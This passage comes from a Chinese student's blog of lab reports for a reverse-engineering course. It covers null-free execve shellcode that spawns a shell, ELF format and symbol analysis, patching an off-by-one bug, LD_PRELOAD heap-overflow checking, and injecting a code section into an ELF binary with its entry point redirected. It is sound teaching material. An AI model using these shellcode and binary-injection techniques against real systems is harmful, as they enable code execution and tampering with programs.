<p>​    我们将汇编代码进行了下面的修改，将/bin/bash分开进行3部分注入</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230406102842361.png" alt="image-20230406102842361" style="zoom:50%;" /></p>
<p>​    然后这样通过反汇编发现机器码中并没有0出现</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230406103105429.png" alt="image-20230406103105429" style="zoom: 33%;" /></p>
<p>​    最终运行机器码进行测试，发现机器码确实能够成功运行并建立一个新的shell</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230406103045146.png" alt="image-20230406103045146" style="zoom:50%;" /></p>
<p>​    其中push ‘h’ 相当于push 0x68，0x68是h的ascii码值。在弹出栈的时候是先弹出4bytes的/bin，接着弹出4bytes的/bas，接着弹出h。这里的push h与mov al, 0xb很类似，后者是只置了最后的不为0，前者是置了h一个byte不为0。</p>
<font color='red'>more details:</font>但是这种情况下，我又测试了/bin  , /,bash和/ ，bin/, bash两种push的方式，虽然说shellcode中并没有0，但是却无法正常进行执行会出现segmentation fault的情况。

<font color='blue'>感觉原因是我们在中间等于补全后加入了0字节，导致字符串提前终止，如果有高手可以向我反馈一下这个问题</font>

<p>ps：其实是shellcde中指令层面进行了优化，指令中没有0，但在实际栈上内存对齐的过程中却引入了0,因此执行的时候会出现错误。</p>
<p>其它算法：采用移位操作左移24右移24，push “h+++”,mov bl “h”</p>
<h4 id="2-1-3-Task-1-c：为系统调用提供参数"><a href="#2-1-3-Task-1-c：为系统调用提供参数" class="headerlink" title="2.1.3 Task 1.c：为系统调用提供参数"></a>2.1.3 Task 1.c：为系统调用提供参数</h4><p>​    在mysh.s中，我们为execve()这个系统调用构造了argv[]数组，我们下面调用execve来运行下面的命令，比如”ls -la”,这里很注意的一点是要用eax作为字符串结尾的一i个标志。为了避免出现0，这里使用了空格符来进行占位，因为我们在运行指令的时候可以知道，空格的加入是不影响指令的解释的。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230406112329758.png" alt="image-20230406112329758" style="zoom: 33%;" /></p>
<p>​    汇编链接执行后，可以看到程序正常执行了ls -la -c的指令</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230406112434588.png" alt="image-20230406112434588" style="zoom: 33%;" /></p>
<p>​    通过反汇编的结果也可以看到确实没有0产生</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230406112656896.png" alt="image-20230406112656896" style="zoom: 33%;" /></p>
<h4 id="2-1-3-Task-1-d：为系统调用提供参数"><a href="#2-1-3-Task-1-d：为系统调用提供参数" class="headerlink" title="2.1.3 Task 1.d：为系统调用提供参数"></a>2.1.3 Task 1.d：为系统调用提供参数</h4><p>​        Execve()系统调用的第三个参数是一个指向环境变量的指针，它允许我们将环境变量传递给程序。</p>
<p>1.首先进行函数数据的构建，这里由于我们在函数参数构建的过程中使用到了eax ebx ecx寄存器，因此我们智能把函数变量保存在edx寄存器中，并且其中我们多使用edi和esi来保存中间变量的信息。另外一个值得注意的问题就是我们在存储cccc=1234的时候，由于这里不是4的整数倍，但是只多一个字符，我们使用上面的策略将“4”单独push进入，这样最终shellcode中不会存在0。</p>
<p><img src="https://fastly.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230406165236298.png" alt="image-20230406165236298" style="zoom: 67%;" /></p>
<p>2.构建函数参数，这一步没什么好说的，按照前面的套路，把/usr/bin/env放进去</p>
<p><img src="https://fastly.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230406165541901.png" alt="image-20230406165541901" style="zoom: 80%;" /></p>
<p>3.第三步构建环境变量，之前我们已经把环境变量存储到edx，edi，esi寄存器中，这时候只要把它们的地址放入栈并且得到栈底地址即可</p>
<p><img src="https://fastly.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230406170950338.png" alt="image-20230406170950338" style="zoom: 80%;" /></p>
<p>​    最终进行测试，可以看到正确打印出环境变量的值</p>
<p><img src="https://fastly.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230406164432950.png" alt="image-20230406164432950" style="zoom:67%;" /></p>
<h3 id="2-2-Task-2-使用代码段"><a href="#2-2-Task-2-使用代码段" class="headerlink" title="2.2 Task 2:使用代码段"></a>2.2 Task 2:使用代码段</h3><p>​        (1):</p>
<p>pop ebx: 将存储在two部分的字符串的地址进行获取，并将它保存在ebx寄存器中    </p>
<p>xor eax,eax:通过xor操作，在shellcode不引入0的情况下将，将eax寄存器置0</p>
<p>mov [ebx+7],al  al是eax寄存器的最低一字节，这个指令是将在地址ebx+7位置开始的一个字节置0，ebx是字符串的地址，因此对应的下面的就是字符*的位置</p>
<p>mov [ebx+8],ebx 这个指令是将ebx的内容保存在ebx+8的位置，也就是替换了AAAA为字符串的地址</p>
<p>mov [ebx+12],eax 这个指令是将ebx+12的位置后面4字节替换为0</p>
<p>lea ecx，[ebx+8]  lea也就是加载有效地址，也就是将[ebx+8]的数据加载到ecx中</p>
<p>xor edx,edx 同样的，置0</p>
<p>mov al,0x0b 将0b存放在eax的低字节中，0x0b对应的是execve的系统调用号</p>
<p>int 0x80  中断系统调用</p>
<p>我们可以看到这里在ebx保存了函数调用的第一个参数，也就是字符串地址，ecx保存了返回地址也就是字符串地址，edx没有环境变量就置空了</p>
<p><img src="https://fastly.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230406180153019.png" alt="image-20230406180153019"></p>
<p>（2）使用mysh2.s给出的构造技术来实现一个新的shellcode，用它执行/usr/bin/env，并打印环境变量a=11,b=22</p>
<p><strong>1.构造字符串</strong></p>
<p>​    按照上一问的例子我们知道，我们需要构造一个字符串，其中包含/usr/bin/env和环境变量的参数，字符串之间通过0进行分割。然后我们在调用的时候需要在字符串中开辟出函数参数的空间，我们知道函数指令参数占据两个，环境变量参数占据3个，因此我们可以使用字符串</p>
<p>db ‘/usr/bin/env*a=11*b=22*AAAABBBBCCCCDDDDEEEE’ </p>
<p><strong>2.对字符串分割符置零</strong></p>
<p>​    有上一问我们知道在进行字符串提取的时候需要将不同参数之间的分割位置置为0，我们在这里进行同样的操作</p>
<p><img src="https://fastly.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230407102158641.png" alt="image-20230407102158641"></p>
<p><strong>3.保存参数地址</strong></p>
<p>​    和上面套路一样，得到参数的地址并存放在字符串中</p>
<p><img src="https://fastly.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230407102641547.png" alt="image-20230407102641547" style="zoom:67%;" /></p>
<p>完整代码如下：</p>
<p><img src="https://fastly.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230407102801707.png" alt="image-20230407102801707" style="zoom:67%;" /></p>
<p>汇编链接后执行，可以看到成功打印出环境变量的值</p>
<p><img src="https://fastly.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230407102902889.png" alt="image-20230407102902889"></p>
<h3 id="2-3-Task-3：编写64位的shellcode"><a href="#2-3-Task-3：编写64位的shellcode" class="headerlink" title="2.3 Task 3：编写64位的shellcode"></a>2.3 Task 3：编写64位的shellcode</h3><p>​    我们之间都是编写的32位的shellcode，下面我们将对64位的shellcode进行编写，64位寄存器和32位类似，只不过在命名上略有区别，例如ebx-&gt;rbx</p>
<p>​    首先我们测试一下实例代码，成功调用起一个新的shell</p>
<p><img src="https://fastly.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230407103452691.png" alt="image-20230407103452691"></p>
<p>​    下面我们要让64位的shellcode执行下面的操作     /bin/sh -c ls -la，这里需要使用/bin/dash</p>
<ol>
<li><p>问题1，/bin/dash是9个字节如何解决</p>
<p>我们可以尝试使用Task 1中的策略，发现确实没有0，可以使用</p>
<p><img src="https://fastly.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230407104236588.png" alt="image-20230407104236588" style="zoom:67%;" /></p>
<p><img src="https://fastly.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230407105714509.png" alt="image-20230407105714509" style="zoom:67%;" /></p>
</li>
</ol>
<p>最终执行结果如下，可以看到获得了bash shell</p>
<p><img src="https://fastly.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230407105755584.png" alt="image-20230407105755584"></p>
<p>64位使用寄存器，分别用rdi,rsi,rdx,rcx,r8,r9作为第1-6个参数。rax作为返回值</p>
<p>回顾：</p>
<p>首先push一个eax=0是作为字符串的终止条件，//和/处理起来情况相同</p>
<p>构建shellcode  ebx filename，ecx为argv数组参数（eax表示终止当前数组），edx参数环境变量的构建，无环境变量置0.</p>
<p>字节对齐方式能够使数据读入的次数降低，在64字节处理器上进行16字节的对齐</p>
]]></content>
      <categories>
        <category>逆向工程</category>
      </categories>
      <tags>
        <tag>逆向工程</tag>
      </tags>
  </entry>
  <entry>
    <title>Reverse1</title>
    <url>/2023/03/09/Reverse1/</url>
    <content><![CDATA[<h1 id="逆向工程"><a href="#逆向工程" class="headerlink" title="逆向工程"></a><center>逆向工程</center></h1><!--

**课程名称：<u>          汇编语言和逆向工程      </u>    成绩评定  ：<u>                                                      </u>**

**实验项目名称: <u>           </u>指导教师 ：<u>          刁文瑞               </u>**

**实验项目编号  ：<u>         实验2     </u>    实验项目类型  ：<u>                         </u>**

**实验地点 ：**<u>       淦昌苑 D226                   </u>

**学生姓名 ：<u>           李卓群              </u> 学号  ：<u>       202000460041     </u>**

**学院 ：<u>      网络空间安全学院                   </u>专业  ：<u>          网络空间安全             ** </u>

**实验时间 ：**<u>             2023         </u> 年  <u>   3  </u> 月  <u>  09</u> 日

-->
<h3 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h3><p>​    本次实验的目标为熟悉 C代码的编译过程和ELF文件格式，并初步学习使用Linux平台的二进制分析工具。</p>
<h3 id="二、实验步骤和结果"><a href="#二、实验步骤和结果" class="headerlink" title="二、实验步骤和结果"></a>二、实验步骤和结果</h3><h4 id="2-1-Task-1：C编译过程"><a href="#2-1-Task-1：C编译过程" class="headerlink" title="2.1 Task 1：C编译过程"></a>2.1 Task 1：C编译过程</h4><p>​    使用gcc -E -P命令只对.c文件进行预处理，    -E表示GCC在预处理后停止，-P使GCC忽略调试信息，使输出更加清晰。下面我们可以看到对.c文件进行预处理后的文件内容</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230309084244068.png" alt="image-20230309084244068"></p>
<p><strong>Q：</strong>可以看到经过预编译过程，main函数中的所有出现的“宏名”都会被“替换文本”所代替，这个过程叫做宏代换，宏代换过程由预编译过程所完成。</p>
<p>扩展：”define”为宏命令。第二部分为宏（macro），一般为缩略语，其名称（宏名）一般大写，而且不能有空格，遵循C变量命令规则。</p>
<p><strong>编译阶段：</strong>经过预编译后进入编译阶段，GCC通常会调用所有的编译阶段，因此需要特殊指令停下来，可以使用-S命令.s是汇编文件的常用扩展名，还可以将-masm=intel传递给GCC,这样就会使用Intel语法翻译汇编语言。从下图中可以看到汇编语言的内容，并且可以看到printf被调用替换为puts来进行优化。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230309090546278.png" alt="image-20230309090546278" style="zoom:67%;" /></p>
<p><strong>汇编阶段：</strong>在汇编阶段，可以得到真正的机器代码，可以使用file工具来确定生成的文件类型。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230309090850787.png" alt="image-20230309090850787"></p>
<p><strong>Q：</strong>可以看到经过file查看，文件类型是 64位的ELF可重定位文件，LSB是linux标准库，relocatable说明是一个可重定位文件，在X86-64架构下运行。可重定位二进制目标文件是一种中间文件，它通常是为可执行文件服务的，也就是说它<strong>并不会用来执行</strong>，而主要是参与链接过程生成可执行文件。</p>
<p>扩展 ：可以使地址平移的代码就叫做可重定位代码，它是在加载的时候，也就是系统给进程确定了物理地址时，才生成绝对地址的。</p>
<p><strong>链接阶段：</strong>此阶段将所有的目标文件链接到一个二进制可执行文件中，链接阶段有时会包含额外的优化过程。大多数编译器都会在编译过程结束时自动调用链接器，可以使用没有特殊开关的GCC完成。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230309092421527.png" alt="image-20230309092421527"></p>
<p><strong>Q：</strong>可以看到最终生成的是一个可执行的ELF文件，是动态链接的，动态链接的 ELF 可执行程序总是指定一个动态链接器或解释器，这里的.so文件指定了动态链接库，在 Linux/x86系统上，ELF 解释器通常是文件/lib/ld-Linux.so.2.</p>
<h4 id="2-2-Tack-2-符号与剥离的二进制文件"><a href="#2-2-Tack-2-符号与剥离的二进制文件" class="headerlink" title="2.2 Tack 2:符号与剥离的二进制文件"></a>2.2 Tack 2:符号与剥离的二进制文件</h4><p>​    分别使用nm和readelf输出a.out二进制文件中的符号，使用man手册可以查看。使用nm命令查看elf文件的符号表</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230309094912359.png" alt="image-20230309094912359"></p>
<p><strong>Q：</strong>可以看到main函数驻留在内存中的代码段，地址是400526.</p>
<p>GCC的默认行为是不自动剥离新编译的二进制文件，但是可以使用strip命令进行剥离</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230309095736838.png" alt="image-20230309095736838"></p>
<p>—strip-all可以删除所有的符号，可以看到执行命令后，符号信息已经被删除。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230309095848264.png" alt="image-20230309095848264"></p>
<p><strong>Q：</strong>可以看到现在执行file命令文件已经被标注为stripped,使用readelf命令进行查看，可以看到模块内部的符号已经被删除，只剩下了 用来保存与动态链接相关的导入导出符号(.dynsym),但是程序的执行并不发生改变，这是因为strip只删除了调试信息，而没有改变程序的执行。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230309101053445.png" alt="image-20230309101053445"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230309100858838.png" alt="image-20230309100858838"></p>
<h4 id="2-3-Task-3-反汇编二进制文件"><a href="#2-3-Task-3-反汇编二进制文件" class="headerlink" title="2.3 Task 3:反汇编二进制文件"></a>2.3 Task 3:反汇编二进制文件</h4><p>objdump是一个简单易用的反汇编程序，可以使用下面的命令查看.rodata段中的内容</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230309101508400.png" alt="image-20230309101508400"></p>
<p><strong>Q：</strong>通过命令我们可以看到printf打印的字符串保存在rodata只读数据段中</p>
<p><img src="https://img-blog.csdnimg.cn/2020042110442273.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MjA1MzUw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>通过下面的命令查看compilation_example.o的ELF头部</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230309102311890.png" alt="image-20230309102311890"></p>
<p>通过下面的命令反汇编目标文件的所有代码，可以看到，结果仅包含main函数的代码，因为这是源文件中定义的唯一函数，可以观察到，目标文件中的数据和代码引用尚未完全解析，尚无对puts调用的(printf)的正确解析.</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230309102723669.png" alt="image-20230309102723669"></p>
<p>上面是对.o文件进行的反汇编操作，下面我们反汇编一个完整的可执行二进制文件a.out，但是之前a.out已经被我们删除了符号应该重新进行生成</p>
<p>1.剥离符号的反汇编</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230309103401422.png" alt="image-20230309103401422"></p>
<p>2.未剥离符号的反汇编</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230309103538133.png" alt="image-20230309103538133"></p>
<p>此部分与目标文件的反汇编代码相比，main函数的入口地址、函数调用的地址都已经确定。这是因为链接之后函数、变量都已经经过了重定位，有了确定的地址。<img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230309104318267.png" alt="image-20230309104318267"></p>
<p><strong>Q：</strong>在未剥离符号.text中可以看到模块分的更清楚，可以直接找到main函数的位置，而剥离符号后的main函数和其它内容合并在一起，难以寻找，这是因为strip删除了调试信息，缩小了文件大小，不利于逆向分析。但是具体的反汇编内容并变化不大，这是因为strip只删除了调试信息，并没有改变二进制文件的执行逻辑，函数还是能正常执行。</p>
<h4 id="2-4-思考题-练习题"><a href="#2-4-思考题-练习题" class="headerlink" title="2.4 思考题/练习题"></a>2.4 思考题/练习题</h4><p>除了使用readelf，我们还可以手工检测ELF头部，使用十六进制查看器xxd以十六进制 格式查看ELF二进制文件的内容，例如使用命令 xxd /bin/ls |  head -n  30来查看/bin/ls程序的前30行</p>
<p>我们使用这个命令来查看一下a.out文件的前30行，并与前面使用readelf下的ELF header内容进行对比</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230309110607143.png" alt="image-20230309110607143"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230309204158923.png" alt="image-20230309204158923"></p>
<p>ELF文件头结构及相关常数被定义在/usr/include/elf.h中，这里是64位版本的ELF文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230309204653866.png" alt="image-20230309204653866" style="zoom:67%;" /></p>
<p><strong>第一行：</strong></p>
<p>可以看到使用xxd命令查看的ELF文件第一行对应着magic number，对照可以发现首先是e_ident[16]=7f45 4c46 0201 0100 0000 0000 0000 0000,其中前4个字节表明这是一个ELF文件，后面的02表示是一个64位的ELF文件，后面的0101分别表示采用小端序和ELF文件的版本，后面的0分别用来表示OS/ABI和ABI Version,几乎所有的可执行文件格式最开始的几个字节都是魔数，用来进行文件识别。</p>
<p><strong>第二行：</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230309205907445.png" alt="image-20230309205907445"></p>
<p>第二行首先对应着e_type，我们可以看到elf.h中定义的ELF文件的格式，e_type对应的是ELF64_Half,它预先被宏定义为uint16_t也就是两个字节，对应小端转化后为0x0002,对应的也就是ET_EXEC可执行文件，后面跟着是e_machine,0x003e，查表可以知道对应的机器是AMD x86-64</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230309210514096.png" alt="image-20230309210514096" style="zoom:50%;" /></p>
<p>下面是4个字节的e_vision,1也就是ELF常见的版本号，下面是Elf64_Addr 的e_entry,通过命令可以查看e_entry对应的是一个8个字节的空间，对应的是入口点的虚拟地址，也就是一个64位的地址。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230309211212652.png" alt="image-20230309211212652" style="zoom:50%;" /></p>
<p><strong>第三行：</strong></p>
<p>接下来是Elf64_Off的e_phoff,和e_shoff，分别都是8个字节，对应的是两个表的偏移量，Program header table：告诉系统如何创建进程映像。用来构造进程映像的目标文件必须具有程序头部表，可重定位文件不需要这个表。Section header table ：包含了描述文件节区的信息，每个节区在表中都有一项，每一项给出诸如节区名称、节区大小这类信息。用于链接的目标文件必须包含节区头部表，其他目标文件可以有，也可以没有这个表。可以看到值分别是0x40和0x19e8（已经做了小端转化），转化为十进制后和readelf中的字段值相同。</p>
<p><strong>第四行：</strong></p>
<p><img src="C:\Users\lc-lzq\AppData\Roaming\Typora\typora-user-images\image-20230309211759588.png" alt="image-20230309211759588"></p>
<p>接下来是Elf64_Word的e_flags,也就是4个字节，一般为0，用来标识一些ELF文件平台相关的属性，下面是ELF_ehsize，它是2个字节，用来标识ELF header的大小，值为0x40，也就是64个字节，这样我们也知道了第四行也就是ELF头文件的最后一行了。下面同样是两个字节的e_phentsize和e_phnum，对应的是programme header table的大小和数量，也就是0x38和0x09，均与下面header中的相应字段对应。最后是section headers的大小和数量，分别是0x40和0x1f，对应的下面的64和31，最后是e_shstrndx,也就是section header的字符串表在节头表中的索引为0x1c 也就是28。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230309212439799.png" alt="image-20230309212439799"></p>
<h5 id="参考文献："><a href="#参考文献：" class="headerlink" title="参考文献："></a>参考文献：</h5><p><a href="https://zhuanlan.zhihu.com/p/447763456">详解宏定义（#define） - 知乎 (zhihu.com)</a></p>
<p><a href="https://blog.csdn.net/nicai888/article/details/73732515">(105条消息) Linux系统—ELF文件之可重定位文件(Relocatable file)解析_Barry.Ji的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/yesyes120/article/details/78944991">(105条消息) 编译原理之可重定位代码是什么意思？_可重定位程序是什么_Cookie1997的博客-CSDN博客</a></p>
<p><a href="https://www.cnblogs.com/lsgxeva/p/9645928.html#:~:text=Dynamically linked ELF executables always specify a dynamic,the ELF interpreter is typically the file %2Flib%2Fld-linux.so.2.">linux 修改 elf 文件的dynamic linker 和 rpath - lsgxeva - 博客园 (cnblogs.com)</a></p>
<p><a href="https://www.cnblogs.com/lcchuguo/p/5105316.html">Linux段管理，BSS段，data段，.rodata段，text段 - lcchuguo - 博客园 (cnblogs.com)</a></p>
]]></content>
      <categories>
        <category>逆向工程</category>
      </categories>
      <tags>
        <tag>逆向工程</tag>
      </tags>
  </entry>
  <entry>
    <title>Reverse4</title>
    <url>/2023/04/20/Reverse4/</url>
    <content><![CDATA[<h1 id="逆向工程"><a href="#逆向工程" class="headerlink" title="逆向工程"></a><center>逆向工程</center></h1><!--

**课程名称：<u>          汇编语言和逆向工程      </u>    成绩评定  ：<u>                                                      </u>**

**实验项目名称: <u>    ELF代码注入技术       </u>指导教师 ：<u>          刁文瑞               </u>**

**实验项目编号  ：<u>         实验4      </u>    实验项目类型  ：<u>                      </u>**

**实验地点 ：**<u>       淦昌苑 D226                   </u>

**学生姓名 ：<u>           李卓群              </u> 学号  ：<u>       202000460041     </u>**

**学院 ：<u>      网络空间安全学院                   </u>专业  ：<u>          网络空间安全              **</u>

**实验时间 ：**<u>             2023         </u> 年  <u>   4  </u> 月  <u>  20</u> 日

-->
<h2 id="1-实验目的"><a href="#1-实验目的" class="headerlink" title="1.实验目的"></a>1.实验目的</h2><p>​    在本次实验中，我们将会学习到几种将代码注入到现有的ELF二进制文件的基本技术，从而允许修改或者扩展二进制文件的行为。</p>
<p>​    本次实验环境为binary虚拟机</p>
<h2 id="2-实验过程和结果"><a href="#2-实验过程和结果" class="headerlink" title="2.实验过程和结果"></a>2.实验过程和结果</h2><h3 id="2-1-使用十六进制编辑器修改Bare-Metal二进制文件"><a href="#2-1-使用十六进制编辑器修改Bare-Metal二进制文件" class="headerlink" title="2.1 使用十六进制编辑器修改Bare-Metal二进制文件"></a>2.1 使用十六进制编辑器修改Bare-Metal二进制文件</h3><h4 id="2-11-观察off-by-one漏洞"><a href="#2-11-观察off-by-one漏洞" class="headerlink" title="2.11 观察off-by-one漏洞"></a>2.11 观察<em>off-by-one</em>漏洞</h4><p>​    <em>off-by-one</em>漏洞通常出现在程序员错误地使用循环条件导致循环读取或者写入过少或者过多字节时，往往与边界验证不严和字符串操作有关。</p>
<p>​    这里大概问题是误用了加密文件的长度导致最后一个字节的内容并没有得到正常的加密，通过对程序进行执行并查看加密数据可以看出，程序未对数据的最后一个字节进行正常加密</p>
<p><img src="https://fastly.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230420084805962.png" alt="image-20230420084805962" style="zoom:67%;" /></p>
<h4 id="2-1-2-修复off-by-onr漏洞"><a href="#2-1-2-修复off-by-onr漏洞" class="headerlink" title="2.1.2 修复off-by-onr漏洞"></a>2.1.2 修复<em>off-by-onr</em>漏洞</h4><p><strong>1.查找导致漏洞的字节.</strong></p>
<p>首先打开xor_encrypt.origin文件，然后我们可以看到代码出现问题的位置，这里使用jne也就是i不等于n-1，那么就进行循环</p>
<p><img src="https://fastly.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230420092022861.png" alt="image-20230420092022861" style="zoom:67%;" /></p>
<p><strong>2.替换违规字节</strong></p>
<p>为了实现该修复，可以使用十六进制编辑器替换jne，转换为jae，因此我们需要查找75 d9的位置，并将75jne的指令修改为jae大于等于跳转的指令</p>
<p><img src="https://fastly.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230420092720389.png" alt="image-20230420092720389" style="zoom:67%;" /></p>
<p>然后我们使用上面的方式进行测试，可以发现最后一个字节已经得到了加密</p>
<p><img src="https://fastly.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230420092931517.png" alt="image-20230420092931517"></p>
<font color='red'>扩展：</font>

<p>上面我们使用的是实验给出的origin文件，如果使用gcc对源代码编译后，再使用objdump进行反汇编分析来找到错误代码的位置，这里代码和实验手册上些许不同，应该是直接使用gcc进行编译过程中进行了优化，但是通过strlen调用的位置，还是能够确定循环比较指令，这里可以看到和n-1进行比较后，ja也就是$n-1&gt;i$的情况，为了使最后一个字节得到有效加密，我们还是需要把ja改为jae的内容，也就是$n-1\le i$的情况。</p>
<p><img src="https://fastly.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230420090746141.png" alt="image-20230420090746141"></p>
<p><img src="https://fastly.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230420093308571.png" alt="image-20230420093308571"></p>
<h3 id="2-2-Task-2：使用LD-PRELOAD修改共享库行为"><a href="#2-2-Task-2：使用LD-PRELOAD修改共享库行为" class="headerlink" title="2.2 Task 2：使用LD_PRELOAD修改共享库行为"></a>2.2 Task 2：使用LD_PRELOAD修改共享库行为</h3><h4 id="2-2-1-堆溢出漏洞"><a href="#2-2-1-堆溢出漏洞" class="headerlink" title="2.2.1 堆溢出漏洞"></a>2.2.1 堆溢出漏洞</h4><p><strong>正常程序：</strong>在正常程序中，我们输入的字符串长度适合缓冲区的长度，则一切正常</p>
<p><strong>过长的输入：</strong>在下面的程序运行中，我们给出了13的长度，但是输入了一个很长的消息，程序会出现崩溃</p>
<p><strong>Q:</strong>可以看到这里提示错误的原因在free()函数，free(): invalid next size (fast)或者是free(): invalid next size (normal)的问题，这大多数是内存泄漏的问题。经常出现的情况是动态数组赋值越界，导致最后在进行free时候，出现内存泄漏。</p>
<p><img src="https://fastly.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230420094500687.png" alt="image-20230420094500687" style="zoom:67%;" /></p>
<h4 id="2-2-2-溢出漏洞检测"><a href="#2-2-2-溢出漏洞检测" class="headerlink" title="2.2.2 溢出漏洞检测"></a>2.2.2 溢出漏洞检测</h4><p>检测堆溢出漏洞的关键思想是重写实现malloc和free函数的共享库，以便在内部跟踪、记录所有已分配缓冲区的大小，并重写strcpy。下面我们可以使用heapcheck.so库来防止堆溢出的发生</p>
<p><img src="https://fastly.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230420095609501.png" alt="image-20230420095609501"></p>
<p>可以看到使用修改以后的库函数，我们成功对溢出的发生进行了检测。</p>
<h3 id="2-3-Task-3：注入代码节"><a href="#2-3-Task-3：注入代码节" class="headerlink" title="2.3 Task 3：注入代码节"></a>2.3 Task 3：注入代码节</h3><h4 id="2-3-1-概述"><a href="#2-3-1-概述" class="headerlink" title="2.3.1 概述"></a>2.3.1 概述</h4><p>下面将实现将一个全新的代码节注入到ELF二进制文件中，可以使用elfinject工具。要对ELF二进制文件添加新节，需要将新节附加到二进制文件的末尾，然后为注入的节创建节头和程序头。</p>
<p><strong>覆盖PT_NOTE：</strong>PT_NOTE头包含了一些二进制文件节的辅助信息，因此可以进行一个安全的覆盖，在覆盖过程中，我们要对相应的标志字段等进行修改。</p>
<p><strong>重定向ELF入口点：</strong>将ELF头部的e_entry字段修改为指向新的.injected节中的地址，而不是原始的入口点</p>
<h4 id="2-3-2-使用elfinject注入ELF节"><a href="#2-3-2-使用elfinject注入ELF节" class="headerlink" title="2.3.2 使用elfinject注入ELF节"></a>2.3.2 使用elfinject注入ELF节</h4><p>下面使用elfinject工具将代码注入到二进制文件中，首先准备好一个待注入的二进制文件，能够输出hello word！，然后在本目录下创建一个ls可执行文件的副本来进行实验</p>
<p><img src="https://fastly.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230420101650741.png" alt="image-20230420101650741"></p>
<p>下面使用elfinject工具对代码进行注入，首先查看elfinject工具的使用方法，然后根据使用方法的描述将hello.bin进行注入，本例中，我们将节附加到二进制文件尾部，并使用.injected和0x800000作为注入节的名称和加载地址，使用0作为入口点。</p>
<p><img src="https://fastly.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230420102100259.png" alt="image-20230420102100259"></p>
<p>在注入后，readelf 显示 ls 二进制文件现在包含了一个名为.injected的代码节，以及包含此节的 PT_LOAD类型的新可执行段。此外，.note.ABI-tag 节和 PT_NOTE 段已经消失，因为它们已经被覆盖了，已注入成功。</p>
<p><img src="https://fastly.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230420102629583.png" alt="image-20230420102629583"></p>
<p>执行修改后的ls，发现输出hello word!，说明我们的代码已经成功注入，在注入代码执行后执行权会交还给文件的原始入口点，以便恢复输出目录列表的正常行为。</p>
<p><img src="https://fastly.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230420103023816.png" alt="image-20230420103023816"></p>
